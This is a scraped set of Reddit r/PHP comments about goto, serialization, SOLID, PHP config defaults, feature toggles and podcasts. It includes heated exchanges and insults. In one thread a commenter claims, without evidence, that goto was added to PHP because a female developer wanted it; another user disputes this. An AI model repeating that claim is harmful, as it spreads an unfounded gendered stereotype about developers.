I like how they have a 90s style gif outlining their past clients which include names like Posh Limousine and Allstate Insurance but then you go to the portfolio work and there isn't a sign of it anywhere. Do any of these Bangalore web developer companies ever say a lick of truth or do they only lie?
I guess over here: https://www.goetas.com/blog/how-do-i-deploy-my-symfony-api-part-4-deploy/
&gt; Only the most pedestrian of plebians is still using anything other than 7.1 I guess you've never worked in a global organisation. I often see extremely outdated systems (not just in PHP) because the risk of changing something that hundreds of thousands of users rely on which generates billions in revenue. Sure updating it on Billy Bobs Bakery or Susans Salon is perfectly fine but in the corporate world, it's not that straightforward. See the banking system and COBOL
Seems interesting but let's say it highlights a possible file, I make some changes to it, improving it then commit back. Won't this increase its score by adding another commit to its count? Obviously, the complexity might come down but the commits go up. Doe's your system account for this?
The reason the old mysql extension was deprecated (in 5.5) and now removed (from 7.0) is because it was really easy to write bad code with it and it did not support modern features like transactions and real prepared statements. I think everyone prefer PDO because it also allows to connect to many types of SQL servers without having to refactor everything.
[Laravel News](https://laravel-news.com/podcast) [Lullabot (Drupal)](https://www.lullabot.com/podcasts/drupalizeme-podcast)
json_decode() will not do it on its own but maybe have a look at https://github.com/cweiske/jsonmapper also note that php serialize/unserialize will persist object classes
I think isajoke
I'd take a look at the [JsonSerializable](http://php.net/manual/en/class.jsonserializable.php) interface. There's also the `Serializable` interface but personally I prefer serializing objects as JSON.
* [PHP Roundtable](https://www.phproundtable.com/) * [PHPUgly](http://www.phpugly.com/) * [php architect's podcast](https://www.phparch.com/podcast/) &lt;- this one is mine * Actually, Cal Evan's has a huge list of [PHP Podcasts](gttps://www.phppodcasts.com) 
I don't think the OP is the author. Score is [calculated here](https://github.com/bmitch/churn-php/blob/master/src/Results/Result.php#L73) as the 'distance' from origin of a point where x= 'no-of-commits' and y='complexity' both normalized to be in range 0...1. The normalization is based on the biggest complexity and the file with most commits. As you suspect, this might produce some odd effects as you commit changes to reduce complexity in the worst offender. I'm curious to try it...
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [bmitch/churn-php/.../**Result.php#L73** (master → 1605875)](https://github.com/bmitch/churn-php/blob/1605875c3d70d2c2d7141f2dd84e60338fc32b37/src/Results/Result.php#L73) ---- ^(Shoot me a PM if you think I'm doing something wrong.)
In the dreyfus model of skill acquisition the novice must be given a clear set of rules that they adhere to rigidly, and as they acquire skill they eventually learn that all rules come with caveats, and learn when rules can (and must) be bent or broken. In short, they acquire *taste* and the recognition of what good code is at an intuitive level, and this unlocks the ability to apply good judgment instead of rigidly following rules. So for novice programmers the advice to learn the SOLID principles and apply them is good advice, and for skilled developers it is largely irrelevant advice. Dependency inversion is indeed one of those things which has gotten too broadly adopted due to the marketing as part of SOLID. People see it as all upside, but the costs that it carries for code readability are considerable, and the benefits tend to be relatively small. In practice people do it to allow easier unit testing, but unit testing itself is also currently somewhat overrated compared to the benefit you get according to studies that have looked at it. Uncle Bob himself has mentioned that he mostly focuses on integration tests and isn't that bothered about having high unit test coverage.
Is there a unserialize counterpart to JsonSerializable at all?
The reason for DateTimePeriod being an object is to enforce its invariants, ie.: - it has to have both a start and an end instant - start and end must have the same timezone (without a timezone an instant is not a true anchor on the timeline) - start has to come before end, ie. the type only works with positive intervals - instant granules must be identical, this is actually enforced by php itself by defaulting to 0 for unspecified granules If any of these are violated then the resulting type is not a DateTimePeriod and thus its relations might not behave as intended. In general using expressive types always come with the burden of verbosity but in my opinion the resulting safety is well worth it. Regarding predicates being pure functions, ie. static functions on the class, that would be fine, however in this case I find the difference somewhat irrelevant (while coding i tried it both ways, but settled on the current form). Hope this helps.
&gt; In the dreyfus model of skill acquisition the novice must be given a clear set of rules that they adhere to rigidly Well this disqualifies 80% of SOLID, as I already explained above. SRP, Open/Closed, ISP, DI are ***not*** a clear set of rules. They're highly subjective, and arbitrary in practice. &gt; Dependency inversion is indeed one of those things which has gotten too broadly adopted due to the marketing as part of SOLID. [...] In practice people do it to allow easier unit testing [...] Case in point, here you're confusing "Dependency Inversion" with "Dependency Injection", which I *also* already explained above. What's the point of SOLID when even proponents of SOLID such as yourself don't know what it is?
You can assert the same invariants in the static methods, probably, but OK, makes sense. At this point it's a design choice I guess. Say I'm not sure why different timezones can't be converted to the same time-zone? Or start/end could also be flipped internally when not in the right order. But yeah. Up to design considerations.
Not directly to a class instance, no. Personally I'd have a simple static method that would convert a JSON string back to an object instance, so you could do this: $entity = new YourClass(/* various constructor args */); $encoded = json_encode($entity); $matchingEntity = YourClass::fromJsonString($encoded); I do something similar with `Serializable` and an array in some of my current projects: public function serialize() { return serialize($this-&gt;toArray()); } public function unserialize($serialized) { $entityData = unserialize($serialized); $this-&gt;county = $entityData['county']; $this-&gt;setFooTotal($entityData['foo']['total']); $this-&gt;setFooReporting($entityData['foo']['reported']); $this-&gt;setIncludes($entityData['includes']); $this-&gt;setStatus($entityData['status']); $this-&gt;setReviewed($entityData['reviewed']); $this-&gt;setConfirmed($entityData['confirmed']); $this-&gt;setBarBaz($entityData['bar']['baz']); $this-&gt;setBarQux($entityData['bar']['qux']); $this-&gt;setNotes($entityData['notes']); $this-&gt;lastUpdatedTimestamp = $entityData['last_updated']; }
Not from JSON itself, out-of-the-box. `unserialize()` does this, but it's also a possible remote code execution attack vector, so I generally recommend avoiding it.
Probably, I've not actually used DBUnit before. I've always found testing DBs to be a bit too involved for unit testing and rely on Integration and End-to-End tests instead.
Just as a warning for using SQLite for your backend tests, it doesn't have as many datatypes as say MySQL, and doesn't do things like truncate values which are too long. If you're doing something with just simple CRUD, it's probably OK but anything more complex SQLite doesn't really cut it.
Or do both. SQLite backed tests are good to verify that your using your ORM/DBAL library of choice correctly -- mocks do that to some extent, but not really. But end-to-end tests should use the actual production database. I only go to Postgres (my usual database of choice) in non end-to-end tests if I'm using features specific to postgres that require it.
I'd highly recommend people adopt a "value object" model for this kind of work. It's already sort-of-there with JsonSerializable. Notice that `jsonSerialize()` doesn't output a string, it outputs (typically) an array value with sub-arrays, scalars and null. Those can be serialized in a non-ambiguous way via JSON, but also a range of other similar algorithms like it, without having to write a separate `somethingSerialize()` for each. I use a variation of the following: interface ValueObject { // Returns a pure "value" (i.e. arrays, scalars, null, where each value in an array is also a value). function toValue(); // Returns an object instance from a value. static function fromValue($value); } Having a static method on an interface is kind of awkward, but works in PHP, and is suitable for the situation.
&gt; The previous default was just 16k, a 256x increase is massive! It's 4MB...
Yep, for a more complex use-case I would probably use a value object in my code. In this case the only reason the code I posted above exists is to add a caching layer while minimizing the complexity of the logic used to implement it.
Awesome thanks! Looks like there don't just talk about Drupal/Laravel, is that correct? I was hoping for something more generic and I'll definitely check these out either way, but I'm just curious.
Thanks! I'll definitely check them out and subscribe later on tonight.
Maybe you should reread my post. I was actually mostly agreeing with you and just trying to add nuance. As far as the difference between dependency inversion and dependency injection, you did point out yourself that in practice the difference is mostly academic. Almost the whole reason people apply dependency inversion principles is to allow dependency injecting mocks to allow for easier unit testing. In short, they go hand in hand and you rarely see them separately. As far as whether SOLID is vague or not. Maybe it is vague, but I would be hard-pressed to come up with a more specific set of rules. Maybe you can illustrate some that you like, or maybe you're of the opinion that rules and programming are incompatible. Either way, in my personal experience telling novice devs to apply SOLID is still better than giving them no guidance at all. Feel free to agree to disagree on that one.
Author here. What do you mean? From 16KB to 4MB is a 256 fold increase. Some distributions already had higher defaults, but the php-src recommendation itself was 16KB until a few month ago: https://github.com/php/php-src/commit/81fb61f97c56405c456a0460b825aa34d903a14e
Modern servers have a lot of memory, I don't read much into this change, except that people haven't looked into it as our servers went from 128MB of RAM to 16GB of RAM throughout the years.
I'd have to agree with all your points to be honest. Having done it myself for the last 6 years, and achieving a double in my salary from doing so.
Interfaces are templates only, no code in the methods. They define what methods must be there, but are completely empty between the braces. There is more to it, take a few minutes and read up on PHP.net: http://php.net/manual/en/language.oop5.interfaces.php
Thanks, but as I already noted, I'm asking /u/therealmalios/ not everyone :-)
This is not language specific, but if you don't already listen to it, [Software Engineering Radio](http://www.se-radio.net/) is my favorite podcast. It's totes digi :D
I tried posting a reply yesterday just after you asked, but the Reddit timer put me at a 2 minute wait. I left the tab open and found it this morning, so I submitted while it didn't have all the updates. I refreshed and deleted because it was redundant.
I'm touched :-) Thanks.
I think my system is better though? just ask yourself this question: does this file need refactoring? and answer yes every time.
https://gitlab.com/DMore/docker-chrome-headless
/u/pmjones can you please share with us how do you find interesting articles to read and share with us here?
completely FREE.... NOT. http://www.codelobster.com/order.html That's marketing dark pattern right there. 
Cool! Just subscribed, I'll check it out as well. I have a large list of podcasts I listen on the commute and just narrow it down xD
PHP 7+ only? I guess everything in PHP 5 doesn't need refactoring
Yup, agreed, these are all just design choices in the end. Re TZ conversion and flipping - in general I always prefer failing incorrect input upfront rather than fixing it. The latter, in my experience, is usually more complex and error prone.
This looks terrible
Do you know any new PHP project by a startup/big company in 2017?
How recently did you turn 12?
It needs “refactoring” to PHP7.
That depends on if you consider deletion refactoring. 
yikes
I don't think COBOL has an upgrade path.
This is first article in my series of blog posts on how to find hidden links in Reddit posts.
I like working with Magento :(
tables for layout, oh my...
Sometimes it's even worse. In college I was taught `addslashes` and `stripslashes`. It wasn't until my first job (which was the college itself lol) that I learned about `mysql_real_escape_string` (and I used it on everything - even integers). Only later did I discover prepared statements.
I have to admit I didn't even open the link. But there are ways to point out what you said without sarcasm 
gross
I so wish this wasn't true :(
I prefer [httpie](https://github.com/jakubroztocil/httpie) brew install httpie and then simply http https://api.joind.in results in the following...[in color too](https://imgur.com/a/dKmth) HTTP/1.1 200 OK Access-Control-Allow-Origin: * Connection: Keep-Alive Content-Length: 363 Content-Type: application/json; charset=utf8 Date: Wed, 11 Oct 2017 20:15:36 GMT Keep-Alive: timeout=10, max=50 Server: Apache X-Powered-By: PHP/5.6.4 { "docs": "http://joindin.github.io/joindin-api/", "events": "https://api.joind.in/v2.1/events", "hot-events": "https://api.joind.in/v2.1/events?filter=hot", "open-cfps": "https://api.joind.in/v2.1/events?filter=cfp", "past-events": "https://api.joind.in/v2.1/events?filter=past", "upcoming-events": "https://api.joind.in/v2.1/events?filter=upcoming" }
^(Hi, I'm a bot for linking direct images of albums with only 1 image) **https://i.imgur.com/2EshWMy.png** ^^[Source](https://github.com/AUTplayed/imguralbumbot) ^^| ^^[Why?](https://github.com/AUTplayed/imguralbumbot/blob/master/README.md) ^^| ^^[Creator](https://np.reddit.com/user/AUTplayed/) ^^| ^^[ignoreme](https://np.reddit.com/message/compose/?to=imguralbumbot&amp;subject=ignoreme&amp;message=ignoreme) 
Calling it "Google Tokens" or "Google2FA" is stupid. It's OTP. Specifically TOTP.
PHP 7 is based on an abstract syntax tree, and yoy can get access to that AST programmatically. This makes it possible to analyze PHP code without having to implement a parser for the language.
never felt the need of goto in 20 years of PHP programming until now.
I've only used 1 in code i've shipped... a tokenizer for 2 different languages at once. Part of it was processing the part of the string before either start sequence was found to inject global variables and then recursively scan that output for start sequences before processing the original sequence. I'm sure it could be replicated in recursive functions, but the inline goto ended up being the fastest executing, and the least amount of code, and the code made perfect sense.
The `goto` construct was introduced in PHP 5.3, which was first released 8 years ago. So your 20 years of looking for use for it are beyond impressive.
In a nutshell, `goto` allows you to eliminate the overhead of using methods/functions/closures as a way of controlling code flow, when you can implement the same logic inline. This has two primary use cases: - Performance for state machines (parsers, validators), those are typically *generated* and in generated code you don't care much about the fact you may have a 2000-line method, you just want the generated code to be fast. - Clarity in select cases, where techniques like "throw early", "return early", or the usual nested if/switch blocks don't fit the logic neatly. Say I've been using "goto" in validator classes, where my error case requires a few lines of set-up (building an error message, setting some flags etc.) so the cleanest way in some of the validators (not all!) was to have an "error:" label to go to.
s/in PHP//g
You may feel the need for a feature even if it has not been released yet.
Yes, just as you may be ignorant of the proper use cases of a feature released 8 years ago.
&gt; Still, consider goto an intermediate-to-advanced technique even though you may be right, I think its safest to consider it a genuinely bad idea. If you know that you are the only developer who will touch that code for its entire lifespan, then by all means, use it as you feel you need to. Because that doesn't describe the vast majority of use-cases for pretty much any code nowadays, I really feel like anything you've said should be appended with a warning **use at your own risk because it's easy to fuck up and a pain in the ass to debug**
I like the idea, but given the actual features of this package, it suffers from Java Enterprise levels of overengineering in my opinion. This application boils down to three components: 1. One or more features 2. One or more rules governing access to each feature, IE a [Specification](https://en.wikipedia.org/wiki/Specification_pattern) 3. The Doorway class that grants or denies access to a feature. A `Rule` is defined as an implementation of an interface with the method `isSatisfiedBy(RequestInterface $request) : bool;` or as a callable. A `Feature` is just a string identifier and a set of rules. Then, your `Doorkeeper` class accepts one or more features and has a single `grantsAccessTo(string $featureName, RequestInterface $request)` method. Toss in some syntactic sugar and you have something like this: $rules = [ function(RequestInterface $request) { return $request-&gt;getAttribute('CLIENT_IP') === '127.0.0.1'; }, new Doorkeeper\Rules\MatchingHeaderValueRule('X-FOO-BAR', 'some value'), new Doorkeeper\Rules\MatchingEnvRule('foo', 'bar', $_SERVER); function() { return mt_rand(0, 2) === 1; } ]; $feature = new Doorkeeper\Feature('foo.bar', $rules); $doorkeeper = new Doorkeeper\Doorkeeper(); $doorkeeper-&gt;setFeature($feature); if($doorKeeper-&gt;grantsAccessTo('foo.bar', $currentRequest) ) { //do stuff } 
**Specification pattern** In computer programming, the specification pattern is a particular software design pattern, whereby business rules can be recombined by chaining the business rules together using boolean logic. The pattern is frequently used in the context of domain-driven design. A specification pattern outlines a business rule that is combinable with other business rules. In this pattern, a unit of business logic inherits its functionality from the abstract aggregate Composite Specification class. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/PHP/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^] ^Downvote ^to ^remove ^| ^v0.27
or maybe he's used BASIC or QBASIC previous to using PHP, in which case a goto would be more well-used.
As an aside, goto in PHP has some restrictions that commonly do not exist in other languages: &gt; This is not a full unrestricted goto. The target label must be within the same file and context, meaning that you cannot jump out of a function or method, nor can you jump into one. You also cannot jump into any sort of loop or switch structure. I have used it exactly one time. I was highly pressured to get something done by a particular deadline and both parties understood it was a temporary measure. It was later refactored.
TIL about feature toggles :) . Interesting stuff. I hope I can one day work on a product where something like this could be usefully implemented.
&gt; even though you may be right, I think its safest to consider it a genuinely bad idea. It's just a simple labeled code jump. It's hilarious to see otherwise intelligent people be *so* terrified of it. Yes, Edgar W. Dijkstra wrote a brief editorial ***in 1968*** that was entitled "Go To Statement Considered Harmful". I'd propose many of those citing this title today have *even read* this material, let alone realize how *vastly* different the context of Dijkstra's concerns are from modern implementations of restricted `goto` as found in languages like JavaScript or PHP. This borderling religious fear from `goto` is nothing more than a modern superstition exhibited by people whose understanding of the problem is too shallow to be judging what others should use or not use. Most code in a modern high-level language doesn't need goto. If you happen to use it a couple of times in a class, your dick won't fall off.
well we will disagree on whether it's a good idea or not, but clearly my last statement stands: if you find you occasionally (or even frequently) need a goto in PHP, you should consider moving to another language. and to be frank, it isn't some stupid-ass superstition. It's simply a construct that makes it easy for newbs who think they are competent enough to use it and thusly fuck up their code as a result. Because of all the issues i've reiterated twice here, my original statement stands. *if you can't trust every fucking person who will use your code to be wise with a goto, then stay the fuck away*, and if you're using them too often, then you shouldn't be using PHP, and instead, you should be using a higher-performance language.
&gt; why introduce the extra overhead? Maybe I'm being a purist here, but IMO unless I'm doing it in some kind of extremely heavy data processing loop, the extra five seconds of "huh? What the hell is this?" is enough of a cognitive cost that I'd avoid it.
Nobody is talking about "using it often". In every single comment I've made I've stressed the use cases are highly specific. You're arguing with a straw-man. Your statement "may stand", that's fine. Continue being terrified of `goto`. You'll excuse me if I can only laugh at that.
i'm not terrified of it at all. I'm not concerned with my ability to use it. I'm concerned that some newb will come along and fuck it up. PHP newbs who think they know enough are common enough as it is. I wouldn't touch it simply because I don't trust *them* when they come along to maintain the code base. Why don't you seem to understand that this is the basis behind my logic? Why don't you seem to understand that i'm not afraid of it?
The /dev/hell podcast is often focused on PHP. It’s also thoroughly enjoyable. http://devhell.info
If you aren't ready to invest five seconds in learning a feature, you may find your skills quickly obsoleted in this industry. And once you invest the five seconds, you won't need five seconds next time. `Goto` is *brutally* simple. This hilarious aversion to even *learning it* is the ultimate demonstration that the hatred towards `goto` is completely irrational and mostly a cultural artifact, and less so a property of its technical pros/cons. 
I don't understand it because in my very first comment up there I said this: &gt; Still, consider goto an intermediate-to-advanced technique. And you're still arguing with a straw-man.
Look, it's pretty simple. The overwhelming majority of devs disagree about the need for a goto statement in the first place, and you yourself said some languages don't need them. As I said, if you find you're using a PHP goto, you shouldn't be using PHP.
&gt; I was highly pressured to get something done by a particular deadline and both parties understood it was a temporary measure... It was later refactored. See kids, unicorns DO exist!
If you want performance you write a C extension for PHP and not PHP.
I heard you the first time, but your mistake is that you think I'm trying to make *you* happy, or win a popularity poll. I'm writing software. You've listen no significant technical reason against goto, aside from some wishy-washy handwaving about it turning into a "mess" and it being "hard to debug", neither of which apply to simple minimal uses of goto. So if you think your naked baseless opinion holds that much merit, keep thinking that. I don't.
I don't know why you are upvoted. Your arguments aren't valid. &gt; Clarity in select cases, where techniques like "throw early", "return early", or the usual nested if/switch blocks don't fit the logic neatly. I dare you, show an example. I will respond how to express the logic neatly without using `goto`. &gt; Performance [...] It's PHP. If you want performance write an extension in C or something. And compared to a return it's not even a difference in the OpCode generated. It's the same jump in the end.
&gt; And compared to a return it's not even a difference in the OpCode generated. It's the same jump in the end. A *return* is absolutely *not* the same opcode as a simple jump. For one, a new stack frame is being pushed, then popped, while the stack is not touched when a jump is made. That's so utterly ignorant, it make me give up providing sample code regarding your "dare" (feel free to tell me this "proves I'm wrong", I frankly don't care about convincing people who arrogance outweighs their knowledge). 
My business used to be based on PHP, and we had, roughly, ~30 systems in production based on PHP, with maybe 2 million lines of code, and none at all were goto.
You can make baseless claims about me all you want, but the fact is by saying that there is a genuine use-case for a PHP goto, you're in the minority, so good luck with that. Most people doing the shit you're doing should be using a better, more filled-out language. PHP doesn't even have enums for god's sake. Fucking enums! pissed me off when I learned that.
&gt; The target label must be within the same file and context I guess it's time to merge all my files into one and do away with all classes and functions.
&gt; you're in the minority, so good luck with that. You keep saying that, you still think this is a popularity contest. I don't need either "good luck" or anyone's approval about the code I write. Also can I remind you that goto passed with a majority of core developer approval when it was added in 5.3? 
Precisely as many uses cases as exit for eval().
https://github.com/igorw/retry/issues/3#issuecomment-56448334
[Perhaps this](https://github.com/ScriptFUSION/Retry/blob/263eb734848e3dcfd530aa9483feebcc39c79ba5/src/retry.php#L32)?
I like it. It's lightweight. I think the use cases I'm trying to accommodate involve persistence and the fact that a request may or may not be present (think workers/console commands/service layer). I know this is just a snippet, and it's very nice, but I guess I'm curious as to how you'd solve easily hydrating rules from some form of storage. But to your point yes, I'll always be guilty of being a little too Java-ish ;-) until I get tired of all the extra work. I've thought about using in a middleware as it is and it would involve setting a Requestor and basically what you have in your second snippet.
I used it to shoehorn transaction retrying into a page of legacy code without having to fuck around with reorganizing the whole shit show. Only time I've used one in php, I believe. 
Photo or it didn’t happen
I can write malware backdoors with goto? /s
I remember when this was added. Pretty much everyone in the community agreed it was a bad idea, but female PHP developers were pretty scarce at the time and it was a girl who wanted to implement it. So the consensus was pretty much "why the hell not?" At least that was the vibe I got from it.
... great power ... great responsibility ... in limited circumstances it may be the right choice but only after investigating other options. In maybe 10 years, I've used it once in some sort of parser/lexer (don't remember now exactly). Generally a state machine would be better in case requirements change and especially if you need more than one goto in a block.
Screw your pic. I want a job offer!
Certainly, doesn't but they can't upgrade to something more modern because of the risks involved, many corporations have this very mindset towards almost everything software based.
I don't like how the context switched from a *catch* and into a *try*... I have to assume PHP is optimized for this case, and will switch back to the *try* context, even though the "beginning" label was after *try*. I've found lots of these retried operations end up returning *null* rather than throwing an exception, but those cases should still be retried. so I just wrap it all in a *while* loop while the response is null and the try count is less than the limit, and replace the "goto beginning;" with "continue;". Then throw the FailingTooHard after the *while* loop. You might be saving memory or running faster by not comparing the response, though.
I appreciate that you really do think you know what you're talking about but you actually do not. It's seldom the risk but more commonly the outlay.
There is only one reason: You are working with old fragile code that for whatever reasons you cannot refactor.
Since you’re probably gonna look it up: http://php.net/manual/en/control-structures.goto.php
http://php.net/manual/en/images/0baa1b9fae6aec55bbb73037f3016001-xkcd-goto.png
Wait... Goto? Is a thing? Damn
I used it once in a single-use, procedural database migration script. goto came in handy to skip over time-consuming portions of the script as it grew longer. It's not code I'd show off but sometimes you just need to get something done.
Trump voter, eh?
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
Nope. I have nothing against female programmers.
I miss using go to in qbasic
Thanks so much for your substantive contributions to the thread! Gosh, you're a gem.
Ok, here is a real use-case. You are iterating through a 3D array searching for a value. You only care if the value exists in the data structure. So once the value is found you set a flag or a variable and can stop searching. In this case you can use a goto to neatly jump out of the deeply nested loop and continue on with the rest of the application. 
I care less for pretty code and more for efficiency when I need performance (such as the doctrine entity manager).
I am an experienced Synfony developer. FosUserBundle has it‘s flaws. We used it in our project but abandoned it for a simpler solution with guard. Since OP does seem to have requirements matching the use case of it, I am pretty sure it‘s the best place to start for OP.
Good place to start and waste a lot of time trying to change it.
There's one thing I don't know how to do simply without a goto : retry something a number of times until it stops throwing an exception (or you reached the maximum number of tries). We have something later let that in our codebase at work, and it's always bugged me. One day I discovered Laravel has a "retry" (I think) helper that does just that, so I thought "cool, I'll check out how he did it !"... Well it turns out there's on "goto" in Laravel, and it's in this function.
He‘s learning PHP. So what would you recommend? The most I‘ve learned was by changing and fixing things, not building them from scratch.
Why not just use `break n`, where `n` is the nesting level?
You can do that just fine with a while loop and a counter. Something like $tries=3; While(tries){ Try { whatever(); break; } Catch { if (!tries—) throw $e; } } On mobile so formatting sucks but that should portray the general concept 
&gt; It was a strategic move to get more women involved. [citation needed] 
&gt; I'd propose many of those citing this title today have not even read this material I'd propose that someone who has would get his name right. 
Come on, it scarcely fits for /r/phphelp where you posted it initially but here this outdated shit is unacceptable. 
Like I said, that was just the vibe I got from it. I was a regular contributor on the codewalkers forum, attended some of the first PHP conferences by PHP Architect. I was deeply immersed in the community before the Zend certification even existed. That was just my impression of how it went down. FFS you don't have to take my word for it.
&gt; Like I said, that was just the vibe I got from it. Here's what you also said: &gt; I remember when this was added. Pretty much everyone in the community agreed it was a bad idea, but female PHP developers were pretty scarce at the time and it was a girl who wanted to implement it. So the consensus was pretty much "why the hell not?" You're quite clearly and obviously saying that the core team implemented goto even though they didn't want one, because a girl wanted it in the language. The "vibe" you were talking about refers to the consensus and the way it was reached. &gt; That is just how it happened, however you want to interpret it. "That is just how it happened" doesn't sound like a "vibe" to me. &gt; It was a strategic move to get more women involved. There can't be a vibe of something being a strategic move to get more women involved. Something either is, or it isn't a strategic move to get more women involved. If it is then people must have discussed it, so I stand by my remark "citation needed". This is a technical discussion about goto, you're bringing gender in it for no reason without being prompted, stating that the vast majority of the PHP community didn't want a goto even though a majority of the core team quite evidently voted in favor of implementing one. Seeing as you're so well ingrained in the community, I would appreciate it if you could point me to some place I can look up the mail discussion. I am always happy to eat my words if I am wrong and I will gladly do so and humbly apologize if you prove that I am. &gt; FFS you don't have to take my word for it. I can't very well read what you write, and assume that you meant something else than what your words say, can I?
I'd say getting that name right would be highly suspicious. 
If you're learning PHP, writing something from scratch is the best way to learn imo
You‘ve got a point if someones unfamiliar with programming. When coming from other languages I don’t think so.
It seems to use mysqli_* not mysql_*. Not that I find the tutorial very useful or anything, but I don't like when mysqli_* is casually called outdated or obsoleted together with mysql_*.
Or put it in a method and just return.
Insane plot twist for sure! 
Got my Bach. degree in CS went to job hunting, thinking I had any kind of competence in programming(spoilers I did not). Took me like 8 months to find the job I am doing right now, I did a lot of horrible non IT jobs in a meanwhile. In the end it was all worth it, I love what I am doing at the moment and I have a really good mentor. Honestly at better places where I went for an interview, they did a written test about logic/math and basic SQL/PHP/programming. I guess your portfolio will help you to land those interviews tho, I didn't have much to show off except my enthusiasm, akwardness and non existing charisma, no one cares about degree in CS btw(it also makes sense why). So what it takes to get a good PHP job? Some basic programming knowledge or at least some key words about technologies, willingness to learn and adapt to situations and a lot of common sense. I did just basicly learn most of postgreSQL, PHP, cakePHP, etc depends what needs to be done on the go(still learning). having a good knowledge of PHP/MVC/SQL before getting a job ofcourse helps and is probably easier thing to do. But it is not necessary.
You see, you just *interpreted* my reply in your own way, and then didn't liked it. This is the real plague of this blessed subreddit. Nowhere did I say that mysqli is outdated. It is the code style, the approach, the techniques that are outdated as fuck. This is the very thing that I told one day before: just adding fucking "i" to the function name won't make your code any better. Since 1997, when this code style was acceptable, smart people were able to learn - [proper error reporting](https://phpdelusions.net/articles/error_reporting) - separaton of concerns, when HTML never meets a database interavtion - templates - ORMs and DB wrappers that ease the database interaction Nothing of this stuff is present in this spam article. But I forgot that every obvious bit should be explained to the members of this sub, or thewyll interpret your words the most wrong way possible. 
Although this is no dout very debatable... `goto` is usfull for doing things like this: foreach ($items as $item) { if ($item-&gt;is_match()) goto match; } $item = new Item(); match: render('find_item.php', $item); as apposed to this: $matching_item = null; foreach ($items as $item) { if ($item-&gt;is_match()) { $matching_item = $item; break; } } if ($matching_item === null) { $item = new Item(); } render('find_item.php', $item);
Ever since I found that GoTo was a valid concept in PHP (while studying for my Zend PHP cert, of all things), I've been keeping an eye out for a reason to use it. I've yet to find one that can't be replaced by more commonly used constructs - breaks, loops, try/catch, etc. I'd love for someone to prove me wrong. But so far as I know, goto only exists in lower level languages because of the lack of functions and higher level concepts, so why would we need to use it in PHP?
Congratulations, you're trying to mock prejudice with even more prejudice.
If someone is familiar with programming, concepts and design patterns, FOS User Bundle is something they should defo not be introduced with as a standard imo
&gt; It is the code style, the approach, the techniques [...] proper error reporting [...] separaton of concerns [...] templates [...] ORMs and DB wrappers Reality to /u/colshrapnel/: this is a 20 line example of using the built-in mysqli\_\*. If you think using an ORM or template engines is a requirement for a basic mysqli\_\* example, you're more confused than OP is.
Who wrote anything about a standard? What are your alternatives?
There are no alternative user management bundles, because user management is domain specific. The alternative to authentication is already in Symfony
A lesson on the politeness: Given you've no objections for the first three issues, first agree with them and then proceed to nitpicking on the last one. A lesson on the logic: who on the Earth would need a "basic mysqli_* example" at all? There is a shitload already. So, if you ventured to create an example worth posting in /r/php, then make it fucking useful. A lesson on PHP. Not ORM but a basic wrapper already exists in PHP, called PDO. It can already make this example not as pathetic as it is. And to let you know, your attempts to defend this shit is as pathetic as well.
Found the british developer
&gt; A lesson on the politeness: Given you've no objections for the first three issues I had objections to most of what you said, I just decided to cut to the chase.
OT: Am I reading this correctly that it produces less machine codes if I write **\true* instead of **true**?
AHAHA, the real fun just begins. Go on, show off :) 
The correct title would be something like "How to use this random barcode generator script in your html"
Your reply is a precise explanation why we see so much shitty PHP code around, thank you.
[removed]
`goto` is much more readable than `break 3;` or `continue 3;`. PHP ought to have labelled break/continue like JS does.
Just to stress on this again, *you don't understand what PDO is*. You're too ignorant to be judging others.
Given your [recent activity](https://www.reddit.com/r/PHP/comments/75otfb/how_does_the_php_realpath_cache_work_and_how_to/do7vxpp/, I have reasons to conclude that your comments are driven not by the honest effort to improve the information provided but you are simply hanging around having fun nitpicking on the irrelevant bits. 
So this snake oil called "put your passwords in the environment" is still alive. http://movingfast.io/articles/environment-variables-considered-harmful/ In practice you need your passwords somewhere on disk, so when you reload the app, the server, or reboot, your app can actually start. So not only would you be failing at "don't store passwords on disk", but you'd be adding the additional vector of having them in your environment, from where they can very easily leak. And adding additional attack vectors for stealing your secrets is then sold as "improving your security". Hilarious. 
https://framework.zend.com/manual/2.4/en/modules/zend.barcode.creation.html 
Hey, could anyone recommend a book on PHP with object oriented practice and possibly some framework talk (as in a book I can buy printed)? Also, not a beginners book, so PHP for dummies or stuff like that is out of the picture. Thanks
Yes. I'm no internal expert, so do your own research. When you call a function or use a constant inside a namespace, PHP first has to look it up in the current namespace, and then fallback to the root namespace. When you prefix with a `\`, PHP does not make that first lookup. See https://veewee.github.io/blog/optimizing-php-performance-by-fq-function-calls/ 
You can find even more reasons if you go through my trash can outside the house. Looking forward to seeing you there.
You'll find even more "reasons" if you go through the trash bin on my front yard. Looking forward to seeing you there.
Did you read the article at all?
Get a room, you two :)
Looks like he [never reads](https://www.reddit.com/r/PHP/comments/75otfb/how_does_the_php_realpath_cache_work_and_how_to/do7vxpp/)
Well, using goto instead of functions is a bit retarded, yes, but goto is the cleanest and the best way to exit loops on some conditions, because creating variables just for checking if you need to exit loop early is ebola, plus you can jump to any place you want, wereas with variables you would need you do checks in every nested loop.
Introducing /u/colshrapnel, who has decided to take on the role of being my obsessed ex-girlfriend.
I have. Somewhere around the middle it starts threading on very thin ice about the security of env. variables and it proposes fragile solutions one can easily get wrong, or are specific to given servers (like nginx). It also ends with this: "The fact is that despite being considered a best practice, env vars are not introducing a lot of advantages…". The overall **tl;dr** is: "don't".
Quite on the contrary, I'm working on a restraining order.
As others have said: lexers and parsers.
Way to much logic in controller.
